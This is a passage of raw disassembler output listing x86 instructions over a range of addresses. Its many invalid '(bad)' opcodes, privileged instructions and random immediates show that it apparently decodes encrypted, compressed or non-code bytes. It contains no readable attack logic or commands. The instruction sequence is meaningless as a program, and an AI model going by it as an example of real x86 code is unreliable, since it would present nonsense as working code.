  41281c:	leave  
  41281d:	cdq    
  41281e:	aas    
  41281f:	fucomip st,st(3)
  412821:	js     0x412825
  412823:	enter  0x2221,0x49
  412827:	ins    BYTE PTR es:[edi],dx
  412828:	fcom   QWORD PTR [ebp-0x6d]
  41282b:	(bad)  
  41282c:	mov    ds:0xde7b4af9,al
  412831:	pop    ebx
  412832:	setae  BYTE PTR [ebx-0x3bcac985]
  412839:	mov    eax,ds:0x7be79c59
  41283e:	fisubr WORD PTR [ecx+0x7b]
  412841:	scas   eax,DWORD PTR es:[edi]
  412842:	lea    eax,[ebx-0x9c21f35]
  412848:	sar    edi,cl
  41284a:	jg     0x412899
  41284c:	sbb    BYTE PTR [edi+ebx*8+0x34f8a091],0xce
  412854:	push   ecx
  412855:	mov    edx,0xa005dd4
  41285a:	aaa    
  41285b:	sar    BYTE PTR [eax],cl
  41285d:	ins    BYTE PTR es:[edi],dx
  41285e:	pop    ecx
  41285f:	push   esi
  412860:	fst    DWORD PTR [edx]
  412862:	aas    
  412863:	sub    BYTE PTR [ecx+0x8],0xb1
  412867:	cdq    
  412868:	jl     0x412810
  41286a:	push   ss
  41286b:	push   cs
  41286c:	push   ebp
  41286d:	iretw  
  41286f:	cmp    eax,0xf3bbca6f
  412874:	js     0x4128bc
  412876:	(bad)  
  412877:	xor    al,0xbf
  412879:	xchg   ebx,eax
  41287a:	out    dx,eax
  41287b:	push   ebx
  41287c:	and    DWORD PTR [ebp-0x2a],eax
  41287f:	cmp    ax,0x2298
  412883:	xchg   ecx,eax
  412884:	fnsave [ebp+ecx*8-0x59]
  412888:	sahf   
  412889:	(bad)  
  41288a:	popf   
  41288b:	pop    ebx
  41288c:	jmp    0xa65c1c91
  412891:	mov    edi,0x46bfb214
  412896:	scas   al,BYTE PTR es:[edi]
  412897:	inc    eax
  412898:	js     0x4128bb
  41289a:	sbb    eax,0xafb67efe
  41289f:	push   ss
  4128a0:	(bad)  
  4128a1:	aaa    
  4128a2:	mov    edi,0xb49cb8c8
  4128a7:	ror    BYTE PTR [ebx+0x18c69376],cl
  4128ad:	mov    edx,0x681059df
  4128b2:	push   ecx
  4128b3:	mov    ebx,0xd4735982
  4128b8:	out    0x7b,al
  4128ba:	inc    ebx
  4128bb:	in     al,0x44
  4128bd:	inc    eax
  4128be:	xchg   ebp,eax
  4128bf:	mov    esp,0xadf94e98
  4128c4:	stos   DWORD PTR es:[edi],eax
  4128c5:	loope  0x41290c
  4128c7:	stos   DWORD PTR es:[edi],eax
  4128c8:	popf   
  4128c9:	(bad)  
  4128ca:	sbb    al,0xe9
  4128cc:	jne    0x41290f
  4128ce:	push   ds
  4128cf:	int3   
  4128d0:	sub    BYTE PTR ds:0x857ed6b8,al
  4128d6:	inc    ebp
  4128d7:	pop    esi
  4128d8:	push   edx
  4128d9:	add    eax,0x7d95d1c2
  4128de:	loopne 0x412884
  4128e0:	and    edx,DWORD PTR [edx-0x32]
  4128e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128e4:	or     eax,0x9de8a8d2
  4128e9:	popf   
  4128ea:	or     BYTE PTR ds:0xfeaa3139,al
  4128f0:	lods   al,BYTE PTR ds:[esi]
  4128f1:	into   
  4128f2:	mov    ecx,0xc57a1a59
  4128f7:	mov    eax,ds:0x4672594b
  4128fc:	in     al,dx
  4128fd:	leave  
  4128fe:	mov    bh,dl
  412900:	cwde   
  412901:	cli    
  412902:	popf   
  412903:	inc    edx
  412904:	mov    eax,ds:0x80292b5f
  412909:	idiv   DWORD PTR [esi+0x5b]
  41290c:	cmc    
  41290d:	iret   
  41290e:	jae    0x412989
  412910:	jb     0x4128de
  412912:	(bad)  
  412913:	fsub   DWORD PTR [esi-0x20747daf]
  412919:	je     0x4128e8
  41291b:	push   eax
  41291c:	call   ebp
  41291e:	xchg   esp,eax
  41291f:	pop    ss
  412920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412921:	inc    ebp
  412922:	loope  0x412945
  412924:	js     0x4128ec
  412926:	pop    edx
  412927:	pushf  
  412928:	ins    DWORD PTR es:[edi],dx
  412929:	push   ss
  41292a:	xor    al,0xbb
  41292c:	out    dx,al
  41292d:	test   dh,bl
  41292f:	ins    DWORD PTR es:[edi],dx
  412930:	adc    ebp,esi
  412932:	jbe    0x412983
  412934:	fcmovnb st,st(1)
  412936:	dec    edx
  412937:	out    dx,eax
  412938:	add    eax,0xb967a5c
  41293d:	jg     0x41293b
  41293f:	shl    BYTE PTR [esi+0x22],1
  412942:	stc    
  412943:	or     al,0x2b
  412945:	sbb    DWORD PTR [edi-0x71c762e9],eax
  41294b:	fst    DWORD PTR [esi]
  41294d:	pop    es
  41294e:	add    ah,dl
  412950:	cs push edx
  412952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412953:	jne    0x4128df
  412955:	rcr    DWORD PTR [eax],cl
  412957:	jmp    0x212f:0x5eb5ae12
  41295e:	xor    bl,BYTE PTR [edi+ecx*2+0x186398c3]
  412965:	xor    eax,DWORD PTR [edx+0x22e2edff]
  41296b:	add    ebp,eax
  41296d:	shl    BYTE PTR [edi-0x28311497],cl
  412973:	fstp   QWORD PTR [edx]
  412975:	repz out 0xa7,al
  412978:	xchg   esi,eax
  412979:	pop    edx
  41297a:	aas    
  41297b:	cmp    BYTE PTR [edi+eax*2-0x69459795],0x5b
  412983:	ds pop ds
  412985:	sub    ebx,DWORD PTR [edx]
  412987:	popa   
  412988:	vpmulhw xmm0,xmm4,XMMWORD PTR [edx-0x75]
  41298d:	inc    ecx
  41298e:	jnp    0x412955
  412990:	mov    ebp,DWORD PTR [edx-0x6053ce61]
  412996:	sti    
  412997:	push   esi
  412998:	sti    
  412999:	jp     0x412937
  41299b:	retf   
  41299c:	mov    ebp,0x3c7832b1
  4129a1:	and    bh,BYTE PTR [ecx]
  4129a3:	sti    
  4129a4:	fld    DWORD PTR [eax-0x6d]
  4129a7:	call   0x5568:0xb2ac2ad
  4129ae:	xor    ebp,DWORD PTR ds:0x1cabbacc
  4129b4:	mov    ds:0xf214909e,al
  4129b9:	lods   eax,DWORD PTR ds:[esi]
  4129ba:	pop    ebx
  4129bb:	icebp  
  4129bc:	sti    
  4129bd:	sbb    ebp,esi
  4129bf:	call   FWORD PTR [esi]
  4129c1:	popf   
  4129c2:	jmp    0x90219080
  4129c7:	jmp    0x4129dc
  4129c9:	retf   
  4129ca:	xchg   edi,eax
  4129cb:	test   BYTE PTR [ebx-0x6026780a],0x9
  4129d2:	cwde   
  4129d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129d4:	popf   
  4129d5:	dec    esp
  4129d6:	fist   WORD PTR [edi-0x1b]
  4129d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129da:	inc    ecx
  4129db:	sub    eax,0xded29fdd
  4129e0:	adc    al,0xb7
  4129e2:	call   0x3c37:0x782b6a74
  4129e9:	popf   
  4129ea:	inc    esi
  4129eb:	js     0x4129d0
  4129ed:	push   ds
  4129ee:	loop   0x4129b9
  4129f0:	mov    ds:0xa6d28c7,eax
  4129f5:	push   ecx
  4129f6:	es push ebx
  4129f8:	test   eax,0xa4d7f0d7
  4129fd:	inc    ecx
  4129fe:	jno    0x4129e4
  412a00:	getsec 
  412a02:	pop    esi
  412a03:	ficom  WORD PTR [ebp+0x38789b6d]
  412a09:	in     al,dx
  412a0a:	gs (bad) 
  412a0d:	mov    edx,0xb3f267f8
  412a12:	cld    
  412a13:	cli    
  412a14:	pop    ss
  412a15:	sub    esi,DWORD PTR [esi-0x835e327]
  412a1b:	shl    DWORD PTR [esi-0x25],0x54
  412a1f:	push   ecx
  412a20:	xchg   ebp,eax
  412a21:	pop    ss
  412a22:	and    BYTE PTR [esi-0x2a6eaa4],bl
  412a28:	push   cs
  412a29:	lods   al,BYTE PTR ds:[esi]
  412a2a:	enter  0xb4dc,0xa9
  412a2e:	in     al,dx
  412a2f:	sbb    al,0x7b
  412a31:	mov    edx,0xc6e22339
  412a36:	sub    bl,BYTE PTR [esi-0x30]
  412a39:	mov    ch,0xef
  412a3b:	jl     0x412a89
  412a3d:	dec    esp
  412a3e:	jp     0x412a77
  412a40:	lds    esi,FWORD PTR [ebp-0x24517f01]
  412a46:	pushf  
  412a47:	mov    ecx,0x29f87cd1
  412a4c:	out    dx,al
  412a4d:	hlt    
  412a4e:	push   0xd502ea29
  412a53:	mov    eax,0x2ba993a0
  412a58:	mov    esi,0xf61d5c18
  412a5d:	jbe    0x412acd
  412a5f:	mov    dl,ch
  412a61:	test   cl,al
  412a63:	mov    eax,0x6461c12a
  412a68:	xor    BYTE PTR [ebp+eax*1+0x2e3960d2],0x68
  412a70:	into   
  412a71:	fnstenv [esi+0x5c]
  412a74:	mov    al,ds:0x55a63306
  412a79:	jns    0x412a96
  412a7b:	fst    QWORD PTR [edx-0x74]
  412a7e:	test   BYTE PTR [ebp+0x19],ch
  412a81:	sbb    edx,0x281b257a
  412a87:	enter  0x2cde,0xf0
  412a8b:	iret   
  412a8c:	je     0x412ad1
  412a8e:	jmp    0xb3fdbf9d
  412a93:	pop    ss
  412a94:	scas   eax,DWORD PTR es:[edi]
  412a95:	fld    DWORD PTR [ebx-0x6b5c94b]
  412a9b:	inc    eax
  412a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9d:	xchg   DWORD PTR [esp+ecx*1-0x470fb39d],edi
  412aa4:	je     0x412a3c
  412aa6:	clc    
  412aa7:	je     0x412a84
  412aa9:	cwde   
  412aaa:	fwait
  412aab:	push   ds
  412aac:	ins    BYTE PTR es:[edi],dx
  412aad:	ficom  WORD PTR [ebp-0x1c]
  412ab0:	or     bl,dl
  412ab2:	(bad)  
  412ab3:	imul   BYTE PTR [edi+0x62071444]
  412ab9:	push   ss
  412aba:	adc    eax,0x142fb8c1
  412abf:	dec    esp
  412ac0:	or     eax,0x8c539c19
  412ac5:	lea    edi,[edi+0x6412b891]
  412acb:	adc    DWORD PTR [ecx],ecx
  412acd:	xor    ecx,DWORD PTR [edx-0x1c]
  412ad0:	into   
  412ad1:	(bad)  
  412ad2:	xlat   BYTE PTR ds:[ebx]
  412ad3:	cmp    BYTE PTR [ecx],cl
  412ad5:	test   al,0x22
  412ad7:	imul   ebp,DWORD PTR [edx+0x17],0xffffffe8
  412adb:	sbb    ecx,DWORD PTR [ecx-0x18]
  412ade:	adc    eax,0xaad3322a
  412ae3:	gs cld 
  412ae5:	repnz out dx,al
  412ae7:	ficomp WORD PTR [ebp+0x497a07fb]
  412aed:	pop    eax
  412aee:	jecxz  0x412b60
  412af0:	jno    0x412a89
  412af2:	stc    
  412af3:	mov    ah,0x9
  412af5:	xchg   esi,eax
  412af6:	sbb    ebp,DWORD PTR [esi-0x5c]
  412af9:	pop    ds
  412afa:	pop    esi
  412afb:	cmp    eax,0xb98e1325
  412b00:	retf   0x776a
  412b03:	jo     0x412b16
  412b05:	imul   ebp,eax,0x973d5f79
  412b0b:	call   0xe0e1e227
  412b10:	mov    ah,BYTE PTR [edi+0x42]
  412b13:	outs   dx,BYTE PTR gs:[esi]
  412b15:	out    dx,eax
  412b16:	fidivr DWORD PTR [ebx+0x25]
  412b19:	mov    ds:0x797cdc42,eax
  412b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b1f:	sub    al,0xcb
  412b21:	clc    
  412b22:	and    dl,BYTE PTR [edi-0x6ab21618]
  412b28:	repz push ss
  412b2a:	and    al,0xba
  412b2c:	mov    ah,0x18
  412b2e:	mov    ch,BYTE PTR [edx+0x59]
  412b31:	ror    BYTE PTR [edx],1
  412b33:	xor    ecx,DWORD PTR [eax-0x1071ba69]
  412b39:	inc    edi
  412b3a:	cli    
  412b3b:	pop    esi
  412b3c:	fst    QWORD PTR [ebx]
  412b3e:	ds ins BYTE PTR es:[edi],dx
  412b40:	out    dx,eax
  412b41:	cmp    eax,0xa66c365e
  412b46:	in     al,dx
  412b47:	jmp    0x412b79
  412b49:	(bad)  
  412b4a:	mov    dl,0xdb
  412b4c:	xchg   DWORD PTR [edx-0x3f1c4723],esi
  412b52:	ror    BYTE PTR [eax],cl
  412b54:	call   0x85e87fab
  412b59:	outs   dx,DWORD PTR ds:[esi]
  412b5a:	loope  0x412b51
  412b5c:	imul   edx,ebx,0x9a66c041
  412b62:	je     0x412b3e
  412b64:	cmp    BYTE PTR [edi],ch
  412b66:	push   cs
  412b67:	adc    DWORD PTR [eax],ebx
  412b69:	iret   
  412b6a:	pop    eax
  412b6b:	jmp    0x412b00
  412b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b6e:	call   0x5423ac8a
  412b73:	pop    edx
  412b74:	cli    
  412b75:	loopne 0x412bc0
  412b77:	inc    ecx
  412b78:	add    esi,DWORD PTR [eax+0x789256af]
  412b7e:	add    bh,BYTE PTR [ebp+0x702f454e]
  412b84:	lock enter 0x6f18,0x1d
  412b89:	ins    DWORD PTR es:[edi],dx
  412b8a:	aam    0x91
  412b8c:	cdq    
  412b8d:	jne    0x412b47
  412b8f:	popf   
  412b90:	les    ebx,FWORD PTR [edx+0x3e]
  412b93:	fcmovnbe st,st(5)
  412b95:	fwait
  412b96:	sub    eax,0x22b7146e
  412b9b:	mov    edi,0x415beee4
  412ba0:	fadd   QWORD PTR [eax+0x5e]
  412ba3:	push   edx
  412ba4:	bound  ebx,QWORD PTR [edx]
  412ba6:	lds    edi,FWORD PTR [edx-0x3eaa60d2]
  412bac:	push   eax
  412bad:	pusha  
  412bae:	(bad)  
  412baf:	aaa    
  412bb0:	(bad)  
  412bb1:	cmp    BYTE PTR [edx+0x64919f50],0x6a
  412bb8:	xor    dh,ch
  412bba:	dec    ecx
  412bbb:	sbb    al,0xe9
  412bbd:	inc    esi
  412bbe:	icebp  
  412bbf:	jb     0x412c1c
  412bc1:	retf   
  412bc2:	mov    DWORD PTR [ecx-0x101f9a4b],edi
  412bc8:	or     dl,cl
  412bca:	sti    
  412bcb:	shl    BYTE PTR [edx+ebx*1],1
  412bce:	scas   eax,DWORD PTR es:[edi]
  412bcf:	stc    
  412bd0:	add    dl,BYTE PTR [edx-0x2f]
  412bd3:	js     0x412c3b
  412bd5:	fidiv  DWORD PTR [eax-0x46]
  412bd8:	xchg   esi,eax
  412bd9:	push   ecx
  412bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bdb:	and    edx,DWORD PTR [edi]
  412bdd:	fild   WORD PTR [esi]
  412bdf:	sbb    ebx,eax
  412be1:	arpl   sp,bp
  412be3:	inc    esp
  412be4:	push   0xffffffb6
  412be6:	hlt    
  412be7:	shl    DWORD PTR [edx],cl
  412be9:	sbb    BYTE PTR [ecx-0x71],bh
  412bec:	and    DWORD PTR [edx+0x21],0x68
  412bf0:	icebp  
  412bf1:	rol    BYTE PTR [esi],0xb2
  412bf4:	loop   0x412c35
  412bf6:	je     0x412b96
  412bf8:	jbe    0x412c73
  412bfa:	fs scas eax,DWORD PTR es:[edi]
  412bfc:	inc    eax
  412bfd:	mov    bh,0x54
  412bff:	popa   
  412c00:	xchg   bl,cl
  412c02:	out    dx,al
  412c03:	jae    0x412c32
  412c05:	xchg   esi,eax
  412c06:	and    eax,0x5010198b
  412c0b:	xchg   ebp,eax
  412c0c:	sbb    DWORD PTR [esi],esp
  412c0e:	and    bl,BYTE PTR [ecx]
  412c10:	sub    ah,BYTE PTR [ebp-0x33]
  412c13:	dec    eax
  412c14:	push   ecx
  412c15:	lods   eax,DWORD PTR ds:[esi]
  412c16:	mov    bl,0xf1
  412c18:	sahf   
  412c19:	mov    ebp,ebx
  412c1b:	ret    0x6e1a
  412c1e:	adc    eax,0x7760589b
  412c23:	adc    eax,0x28d3c491
  412c28:	enter  0x5399,0x70
  412c2c:	cmp    al,0x6c
  412c2e:	sbb    al,0xb5
  412c30:	hlt    
  412c31:	(bad)  
  412c32:	adc    DWORD PTR [esi-0x1126f802],esp
  412c38:	sub    dl,BYTE PTR [eax+0x5f]
  412c3b:	mov    DWORD PTR ds:0xc14fa80f,ebx
  412c41:	push   ss
  412c42:	bound  edx,QWORD PTR es:[ecx]
  412c45:	push   0xffffffc8
  412c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c48:	mov    bh,al
  412c4a:	std    
  412c4b:	cmp    eax,ebp
  412c4d:	inc    edx
  412c4e:	je     0x412c14
  412c50:	lods   al,BYTE PTR ds:[esi]
  412c51:	imul   eax,DWORD PTR [ebx+0x72],0x191482c1
  412c58:	mov    bh,0x13
  412c5a:	(bad)  
  412c5b:	ror    BYTE PTR [edi+esi*2-0x5d42b424],1
  412c62:	push   edx
  412c63:	in     al,0x95
  412c65:	retf   0xc56b
  412c68:	cwde   
  412c69:	xor    BYTE PTR [edx+0x5],dl
  412c6c:	pop    ds
  412c6d:	dec    ebp
  412c6e:	in     eax,dx
  412c6f:	js     0x412cac
  412c71:	mov    edi,0xf09bf7d3
  412c76:	ror    BYTE PTR [esi-0xcde4410],cl
  412c7c:	xchg   BYTE PTR [esi-0xb],ch
  412c7f:	mov    ebp,DWORD PTR [esi-0x6a]
  412c82:	dec    edi
  412c83:	push   ecx
  412c84:	fisub  DWORD PTR [ecx+0x43abea27]
  412c8a:	jge    0x412c8f
  412c8c:	or     eax,0xe635e3e5
  412c91:	sub    cl,BYTE PTR ds:0xd0602546
  412c97:	push   ebx
  412c98:	jg     0x412d03
  412c9a:	sub    dl,BYTE PTR [ebx-0x3cb0b1aa]
  412ca0:	mov    ds:0xd5c8fba5,eax
  412ca5:	repnz push eax
  412ca7:	inc    ebp
  412ca8:	cmp    DWORD PTR [esi+0x5],esi
  412cab:	shl    eax,0x1a
  412cae:	inc    ecx
  412caf:	aad    0x16
  412cb1:	and    DWORD PTR [ebx+0x4d],ebx
  412cb4:	cmp    al,0x1e
  412cb6:	pushf  
  412cb7:	jnp    0x412d09
  412cb9:	imul   ebp,DWORD PTR [edi-0x792ecad0],0x9dc71a9b
  412cc3:	mov    esp,0xaf1b8651
  412cc8:	repz cmp dh,BYTE PTR [ebx]
  412ccb:	and    DWORD PTR [ebx+0x59],esi
  412cce:	jmp    0xee33:0xd0f88b57
  412cd5:	icebp  
  412cd6:	cmc    
  412cd7:	jmp    0x412d07
  412cd9:	daa    
  412cda:	push   ss
  412cdb:	repnz pop es
  412cdd:	aaa    
  412cde:	mov    BYTE PTR [ebp-0xb],dh
  412ce1:	dec    esi
  412ce2:	adc    eax,0x9b402c8c
  412ce7:	rcl    BYTE PTR [ebx-0x9b92526],1
  412ced:	lods   eax,DWORD PTR ds:[esi]
  412cee:	aaa    
  412cef:	ja     0x412d2c
  412cf1:	aas    
  412cf2:	sub    dh,BYTE PTR [ebx+0x4ef1a99e]
  412cf8:	jecxz  0x412d18
  412cfa:	push   esi
  412cfb:	bnd je 0x412d40
  412cfe:	stos   BYTE PTR es:[edi],al
  412cff:	sub    al,0xcd
  412d01:	dec    eax
  412d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d03:	and    DWORD PTR [esi+0x582f2e5],esi
  412d09:	sub    BYTE PTR [eax+0x4b796bf],ch
  412d0f:	arpl   bx,ax
  412d11:	inc    ebp
  412d12:	push   ebp
  412d13:	out    dx,al
  412d14:	repz mov ds:0x8f0b9b9c,ax
  412d1b:	or     BYTE PTR [esi+edi*8],dh
  412d1e:	jo     0x412d79
  412d20:	mov    DWORD PTR [esi-0x60],edx
  412d23:	in     eax,0xfe
  412d25:	loopne 0x412d7c
  412d27:	lds    eax,FWORD PTR [eax]
  412d29:	mov    DWORD PTR [edx-0x2],edx
  412d2c:	sbb    BYTE PTR [edi-0x3b],bl
  412d2f:	repz sbb al,0x47
  412d32:	mov    esi,0xc2bfef37
  412d37:	cmp    dh,bh
  412d39:	pop    eax
  412d3a:	pop    ss
  412d3b:	cwde   
  412d3c:	cli    
  412d3d:	arpl   WORD PTR [esi-0x72177f74],ax
  412d43:	pop    edx
  412d44:	and    DWORD PTR [ebx],0xffffff9b
  412d47:	test   ebx,ebx
  412d49:	sub    edx,DWORD PTR [edi]
  412d4b:	cld    
  412d4c:	adc    DWORD PTR [ebx],0x7c
  412d4f:	repz je 0x412db4
  412d52:	xor    bl,BYTE PTR [eax-0x3556d3e2]
  412d58:	scas   eax,DWORD PTR es:[edi]
  412d59:	adc    al,0x40
  412d5b:	mov    eax,ds:0x72c90a66
  412d60:	push   edx
  412d61:	das    
  412d62:	mov    ecx,0x7e86138f
  412d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d68:	add    eax,0x9e629b89
  412d6d:	pop    es
  412d6e:	shr    BYTE PTR ss:[edi-0x1c],1
  412d72:	(bad)  
  412d73:	shl    ebp,cl
  412d75:	cmc    
  412d76:	bound  ebx,QWORD PTR [ebx+ebx*2]
  412d79:	cld    
  412d7a:	fs int3 
  412d7c:	and    eax,0xc4ce610
  412d81:	sbb    DWORD PTR [ebx+0x5ef77778],ebx
  412d87:	pushf  
  412d88:	cmp    ebx,esp
  412d8a:	or     BYTE PTR [esi+0x5f],cl
  412d8d:	adc    BYTE PTR [edx-0x3a],dl
  412d90:	aaa    
  412d91:	stos   BYTE PTR es:[edi],al
  412d92:	aaa    
  412d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d94:	imul   ebx,DWORD PTR [ebp+0x561a3b87],0xffffffb1
  412d9b:	jo     0x412d51
  412d9d:	push   eax
  412d9e:	push   ebx
  412d9f:	lods   eax,DWORD PTR ds:[esi]
  412da0:	out    dx,al
  412da1:	repz pop ss
  412da3:	and    BYTE PTR [ebx+0x7c50e37d],dh
  412da9:	and    edi,0xffffffb8
  412dac:	enter  0x5c9f,0x3d
  412db0:	in     eax,0xb1
  412db2:	rcr    ch,0xc4
  412db5:	not    bh
  412db7:	fcmove st,st(5)
  412db9:	das    
  412dba:	xor    edx,0xffffffae
  412dbd:	cld    
  412dbe:	add    BYTE PTR [edi],bh
  412dc0:	push   ebx
  412dc1:	xchg   BYTE PTR [ebx],bl
  412dc3:	in     eax,0xc
  412dc5:	addr16 inc ebp
  412dc7:	add    DWORD PTR [edx-0x16],esp
  412dca:	sub    BYTE PTR [edi],al
  412dcc:	xchg   edx,eax
  412dcd:	(bad)  
  412dce:	(bad)  [edi+edx*2+0x28]
  412dd2:	add    dl,ch
  412dd4:	hlt    
  412dd5:	shl    dl,cl
  412dd7:	or     esp,esi
  412dd9:	xchg   esi,eax
  412dda:	mov    bl,0x1f
  412ddc:	(bad)  
  412ddd:	cs (bad) 
  412ddf:	mov    ds:0x52511a87,al
  412de4:	jl     0x412e0f
  412de6:	test   eax,0x21b53d16
  412deb:	mov    ds:0x54bd2830,al
  412df0:	mov    edx,0x8d699809
  412df5:	aas    
  412df6:	sub    ch,BYTE PTR [edi]
  412df8:	gs adc edi,ebx
  412dfb:	adc    ah,BYTE PTR [edi-0x5bf9423a]
  412e01:	fimul  WORD PTR [ebx+0x58d149df]
  412e07:	stc    
  412e08:	mov    al,0x82
  412e0a:	lods   al,BYTE PTR ds:[esi]
  412e0b:	hlt    
  412e0c:	and    cl,bh
  412e0e:	rol    bl,0xa1
  412e11:	cli    
  412e12:	shr    DWORD PTR [eax],0x35
  412e15:	jecxz  0x412dde
  412e17:	or     al,0x64
  412e19:	pop    ecx
  412e1a:	(bad)  
  412e1b:	mov    ah,0x96
  412e1d:	loope  0x412e3d
  412e1f:	in     al,dx
  412e20:	jge    0x412e0e
  412e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e23:	shl    bl,0x2e
  412e26:	retf   
  412e27:	pop    edx
  412e28:	gs (bad) 
  412e2a:	sub    BYTE PTR [ebx+0x6c],bl
  412e2d:	adc    al,BYTE PTR [esi]
  412e2f:	cmp    BYTE PTR [esi+0x4f],ch
  412e32:	adc    al,0xf9
  412e34:	xchg   ebx,eax
  412e35:	inc    edi
  412e36:	xor    eax,0x30630d07
  412e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e3c:	mov    cl,0x12
  412e3e:	adc    al,0x62
  412e40:	jmp    0x412e76
  412e42:	dec    esi
  412e43:	stos   DWORD PTR es:[edi],eax
  412e44:	or     dl,ah
  412e46:	inc    esi
  412e47:	mov    eax,ds:0xfd37ed7b
  412e4c:	jne    0x412e5f
  412e4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e4f:	loop   0x412e54
  412e51:	and    ecx,edx
  412e53:	push   ebp
  412e54:	jbe    0x412e61
  412e56:	icebp  
  412e57:	sbb    BYTE PTR [ebp+0x3b],0xb2
  412e5b:	aas    
  412e5c:	ja     0x412e9d
  412e5e:	sbb    ebp,DWORD PTR [esi-0x2877af9b]
  412e64:	pop    ebp
  412e65:	mov    bh,0xd1
  412e67:	fcmovb st,st(6)
  412e69:	out    dx,eax
  412e6a:	bound  edi,QWORD PTR [esi-0xea4622c]
  412e70:	and    al,0xdd
  412e72:	icebp  
  412e73:	and    dl,dh
  412e75:	je     0x412edc
  412e77:	out    dx,al
  412e78:	xchg   edx,eax
  412e79:	out    0x71,eax
  412e7b:	rcr    DWORD PTR [eax-0x6bd4c221],0x8e
  412e82:	xchg   BYTE PTR ds:0x4e584d8c,dl
  412e88:	mov    ds:0xb55369ee,al
  412e8d:	arpl   bp,dx
  412e8f:	mov    dh,al
  412e91:	(bad)  
  412e92:	mov    ebx,DWORD PTR [ecx-0x710c9bb5]
  412e98:	push   edi
  412e99:	cld    
  412e9a:	cld    
  412e9b:	pop    ss
  412e9c:	in     eax,0x99
  412e9e:	sbb    bh,ah
  412ea0:	add    ebp,eax
  412ea2:	dec    ebx
  412ea3:	cmp    dl,BYTE PTR [ebp-0x23]
  412ea6:	ja     0x412e9d
  412ea8:	cmp    eax,0xa047855f
  412ead:	jge    0x412f1b
  412eaf:	jle    0x412e7c
  412eb1:	(bad)  
  412eb3:	dec    eax
  412eb4:	jbe    0x412f28
  412eb6:	enter  0x4c0,0xef
  412eba:	xchg   ebx,eax
  412ebb:	dec    DWORD PTR [edi+0x18b84e3e]
  412ec1:	dec    ecx
  412ec2:	dec    edx
  412ec3:	pop    edx
  412ec4:	sar    bh,0xb0
  412ec7:	fcom   DWORD PTR [ebx-0x33d5e1a6]
  412ecd:	mov    eax,0x8a813bc1
  412ed2:	lods   al,BYTE PTR ds:[esi]
  412ed3:	call   0x4e64705e
  412ed8:	jmp    0x5d0e80ac
  412edd:	es push cs
  412edf:	std    
  412ee0:	aad    0xbd
  412ee2:	sbb    cl,bl
  412ee4:	and    eax,0x8fe7d90d
  412ee9:	outs   dx,DWORD PTR ds:[esi]
  412eea:	xlat   BYTE PTR ds:[ebx]
  412eeb:	sub    dh,al
  412eed:	cwde   
  412eee:	(bad)  
  412ef0:	sar    eax,1
  412ef2:	inc    ecx
  412ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef4:	xor    bh,BYTE PTR [ebp+0x1f]
  412ef7:	or     al,0xd
  412ef9:	inc    ecx
  412efa:	or     al,0x5
  412efc:	xor    ebx,edi
  412efe:	push   es
  412eff:	inc    edi
  412f00:	pop    edx
  412f01:	stc    
  412f02:	xchg   edi,eax
  412f03:	out    0x33,al
  412f05:	sbb    dl,0xc6
  412f08:	jne    0x412f46
  412f0a:	xchg   ebx,eax
  412f0b:	mov    eax,ds:0xe72165a7
  412f10:	sti    
  412f11:	pop    edi
  412f12:	jmp    0x412eb2
  412f14:	xor    al,0xb7
  412f16:	or     edx,DWORD PTR [esi+0x71]
  412f19:	repz mov esp,0xcf4c4c2
  412f1f:	mov    ah,0xbf
  412f21:	mov    ebp,esp
  412f23:	icebp  
  412f24:	jl     0x412f46
  412f26:	jge    0x412ef3
  412f28:	cmp    DWORD PTR [edx-0x213262f9],0x31d780e6
  412f32:	jmp    0x412ef9
  412f34:	adc    dl,BYTE PTR [edx+0x3]
  412f37:	loop   0x412fa2
  412f39:	dec    ebp
  412f3a:	scas   al,BYTE PTR es:[edi]
  412f3b:	pusha  
  412f3c:	pop    esp
  412f3d:	popa   
  412f3e:	xor    DWORD PTR [edi+0x22],esi
  412f41:	cmc    
  412f42:	push   edx
  412f43:	fild   QWORD PTR [edx+eiz*2]
  412f46:	push   esp
  412f47:	mov    dl,0x6c
  412f49:	xor    al,0xb1
  412f4b:	scas   al,BYTE PTR es:[edi]
  412f4c:	mov    cl,dl
  412f4e:	(bad)  
  412f50:	mov    BYTE PTR [edi+ecx*1-0x5cbeda71],0x46
  412f58:	xchg   esp,eax
  412f59:	xor    eax,0x436b301c
  412f5e:	jne    0x412f30
  412f60:	adc    DWORD PTR [ecx],ebp
  412f62:	xor    eax,0xb81fa9a3
  412f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f68:	inc    ebp
  412f69:	pop    eax
  412f6a:	cmp    edx,DWORD PTR [edx+0x3d]
  412f6d:	loop   0x412f4a
  412f6f:	into   
  412f70:	cmp    cl,BYTE PTR ds:0xa0541bf3
  412f76:	pop    ss
  412f77:	std    
  412f78:	repz ror ah,0x94
  412f7c:	mov    al,0x7e
  412f7e:	dec    edi
  412f7f:	mov    DWORD PTR [ecx+0x5a],esp
  412f82:	cmp    DWORD PTR [edi+0x11ab3b27],esi
  412f88:	fistp  DWORD PTR [eax-0xe]
  412f8b:	mov    bh,dl
  412f8d:	je     0x412fa5
  412f8f:	das    
  412f90:	stc    
  412f91:	out    0x27,eax
  412f93:	leave  
  412f94:	push   es
  412f95:	popa   
  412f96:	mov    dh,0xa6
  412f98:	sbb    ah,cl
  412f9a:	inc    ebp
  412f9b:	or     DWORD PTR [esi-0x4],edi
  412f9e:	and    eax,0xf76bea25
  412fa3:	into   
  412fa4:	mov    bl,0xcb
